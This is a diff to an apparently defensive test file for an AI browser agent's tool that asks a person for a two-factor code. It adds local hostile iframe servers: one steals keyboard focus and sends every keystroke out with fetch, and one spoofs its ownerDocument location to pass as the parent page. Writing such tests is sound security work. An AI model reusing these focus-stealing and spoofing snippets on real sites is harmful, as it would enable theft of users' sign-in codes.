@@ -7,8 +7,9 @@
  *   npm run test:input-requests
  *
  * The scenarios are the ones this was built for: a person answers straight away; a
- * person answers twelve hours later, after the page has died; a code gets refused; and
- * a login with its authenticator saved in the Vault, which asks nobody at all.
+ * person answers twelve hours later, after the page has died; a code gets refused; a
+ * frame from another site trying to get hold of a code; and a login with its
+ * authenticator saved in the Vault, which asks nobody at all.
  */
 import assert from "node:assert/strict";
 import { spawn, type ChildProcessWithoutNullStreams } from "node:child_process";
@@ -60,6 +61,9 @@ function startSite() {
     /** How long a page waits for its code. */
     pageLifeMs: 60_000,
     totpSecret: null as string | null,
+    /** Whatever else the two-factor page carries, like somebody else's widget. */
+    extra: "",
+    boxPerDigit: false,
     url: "",
   };
   const page = (title: string, body: string) =>
@@ -79,10 +83,17 @@ function startSite() {
   });
   app.get("/two-factor", (_req, res) => {
     if (!pending) return res.redirect("/login");
+    const box = site.boxPerDigit
+      ? `<input type="hidden" name="code" id="whole">${[1, 2, 3, 4, 5, 6]
+          .map((n) => `<input class="digit" maxlength="1" size="1" aria-label="Digit ${n}">`)
+          .join(
+            "",
+          )}<script>const boxes=[...document.querySelectorAll(".digit")];boxes.forEach((box,i)=>box.addEventListener("input",()=>{document.getElementById("whole").value=boxes.map((b)=>b.value).join("");if(box.value&&boxes[i+1])boxes[i+1].focus()}));</script>`
+      : `<label>Code <input name="code" type="text" autocomplete="one-time-code"></label>`;
     res.send(
       page(
         "Enter your code",
-        `<form method="post" action="/two-factor"><label>Code <input name="code" type="text" autocomplete="one-time-code"></label><button type="submit">Verify</button></form>`,
+        `<form method="post" action="/two-factor">${box}<button type="submit">Verify</button></form>${site.extra}`,
       ),
     );
   });
@@ -118,6 +129,46 @@ function startSite() {
       site.url = `http://127.0.0.1:${(server.address() as AddressInfo).port}`;
       resolve({
         site,
+        close: () =>
+          new Promise((done) => {
+            server.closeAllConnections();
+            server.close(() => done());
+          }),
+      });
+    });
+  });
+}
+
+/**
+ * Somebody else's widget, reached as `localhost` so it's another site to Chrome. Whatever
+ * reaches one of its boxes comes back here, as it would to whoever wrote it.
+ */
+function startHostileFrames() {
+  const app = express();
+  const got: string[] = [];
+  app.get("/got", (req, res) => {
+    got.push(String(req.query.value ?? ""));
+    res.send("ok");
+  });
+  const report = `box.addEventListener("input",()=>fetch("/got?value="+encodeURIComponent(box.value)));`;
+  // Takes the keyboard whenever it doesn't have it. No model has to fall for anything.
+  app.get("/thief", (_req, res) => {
+    res.send(
+      `<!doctype html><label>Chat <input id="box"></label><script>const box=document.getElementById("box");setInterval(()=>{if(document.activeElement!==box)box.focus()},1);${report}</script>`,
+    );
+  });
+  // Tells anyone who asks the element where it is that it's on the page around it.
+  app.get("/liar", (req, res) => {
+    const top = JSON.stringify(String(req.query.top));
+    res.send(
+      `<!doctype html><label>Verification code <input id="box" type="text"></label><script>const box=document.getElementById("box");Object.defineProperty(box,"ownerDocument",{value:{defaultView:{location:{href:${top}}},URL:${top}}});${report}</script>`,
+    );
+  });
+  return new Promise<{ got: string[]; url: string; close: () => Promise<void> }>((resolve) => {
+    const server: Server = app.listen(0, "127.0.0.1", () => {
+      resolve({
+        got,
+        url: `http://localhost:${(server.address() as AddressInfo).port}`,
         close: () =>
           new Promise((done) => {
             server.closeAllConnections();
@@ -165,6 +216,7 @@ function startTools(env: Record<string, string>) {
 
 const server = await startTestServer();
 const { site, close: closeSite } = await startSite();
+const hostile = await startHostileFrames();
 let failed = false;
 const closers: Array<() => unknown> = [];
 
@@ -224,7 +276,7 @@ try {
       continuationDeadlineAt: new Date(Date.now() + 3_600_000),
     });
 
-  const signIn = async (tools: ReturnType<typeof startTools>): Promise<void> => {
+  const signIn = async (tools: ReturnType<typeof startTools>): Promise<string> => {
     const opened = await tools.call("browser_open", { url: `${site.url}/login` });
     assert.equal(opened.isError, false, opened.text);
     assert.match(opened.text, /Sign in/);
@@ -232,6 +284,7 @@ try {
     await tools.call("browser_fill", { selector: 'input[name="password"]', value: "pw" });
     const submitted = await tools.call("browser_click", { selector: 'button[type="submit"]' });
     assert.match(submitted.text, /Enter your code/, submitted.text);
+    return submitted.text;
   };
 
   const api = (route: string, method = "GET", body?: unknown) =>
@@ -444,6 +497,81 @@ try {
     );
   }
 
+  // ─────────────── somebody else's frame on the page
+  say("a frame from another site takes the keyboard while a code is going in");
+  {
+    site.accepted.length = 0;
+    hostile.got.length = 0;
+    site.extra = `<iframe title="Chat" src="${hostile.url}/thief"></iframe>`;
+    const run = await newRun();
+    const { tools } = await session(run.id);
+    await signIn(tools);
+    const asked = askForCode(tools);
+    const card = await untilAsking();
+    const code = site.phone!;
+    await api(`/${card.id}/answer`, "POST", { value: code, pageOrigin: card.pageOrigin });
+    const reply = await asked;
+    assert.equal(reply.isError, true, reply.text);
+    assert.match(reply.text, /took the keyboard/);
+    assert.ok(!reply.text.includes(code), "the model never sees the code");
+    await delay(300);
+    assert.ok(
+      hostile.got.every((typed) => typed.length <= 1),
+      `the frame got no more than a key that raced the check: ${JSON.stringify(hostile.got)}`,
+    );
+    assert.deepEqual(site.accepted, [], "and nothing was submitted");
+    say("  typing stopped, the frame got nothing usable, and the model was told");
+    site.extra = "";
+    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
+  }
+
+  say("a frame from another site says it's the page, to get a code typed into it");
+  {
+    hostile.got.length = 0;
+    site.extra = `<iframe title="Verify" src="${hostile.url}/liar?top=${encodeURIComponent(`${site.url}/two-factor`)}"></iframe>`;
+    const run = await newRun();
+    const { tools } = await session(run.id);
+    const seen = await signIn(tools);
+    const ref = /textbox "Verification code" \[ref=(\w+)\]/.exec(seen)?.[1];
+    assert.ok(ref, `the frame's box is in the snapshot:\n${seen}`);
+    const refused = await tools.call("browser_ask_person", {
+      needs: "code",
+      label: "Sign-in code",
+      selector: `aria-ref=${ref}`,
+    });
+    assert.equal(refused.isError, true, refused.text);
+    assert.match(refused.text, /frame from a different site/);
+    assert.equal((await open()).length, 0, "and nobody was asked");
+    say("  refused before anyone was asked, whatever the frame said about itself");
+    site.extra = "";
+    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
+  }
+
+  say("a form with a box per digit, which moves along as each one's typed");
+  {
+    site.accepted.length = 0;
+    site.boxPerDigit = true;
+    const run = await newRun();
+    const { tools } = await session(run.id);
+    await signIn(tools);
+    const asked = tools.call("browser_ask_person", {
+      needs: "code",
+      label: "FreeAgent sign-in code",
+      selector: "input.digit",
+      submitSelector: 'button[type="submit"]',
+    });
+    const card = await untilAsking();
+    const code = site.phone!;
+    await api(`/${card.id}/answer`, "POST", { value: code, pageOrigin: card.pageOrigin });
+    const reply = await asked;
+    assert.equal(reply.isError, false, reply.text);
+    assert.match(reply.text, /VAT return filed/, reply.text);
+    assert.deepEqual(site.accepted, [code]);
+    say("  each digit found its box, and the page accepted it");
+    site.boxPerDigit = false;
+    await AppDataSource.getRepository(Run).update({ id: run.id }, { status: "completed" });
+  }
+
   // ─────────────── the Vault, asking nobody
   say("the login's authenticator is in the Vault, so nobody needs to be asked");
   {
@@ -526,6 +654,7 @@ try {
     }
   }
   await closeSite();
+  await hostile.close();
   await server.close().catch(() => undefined);
 }
 process.exit(failed ? 1 : 0);
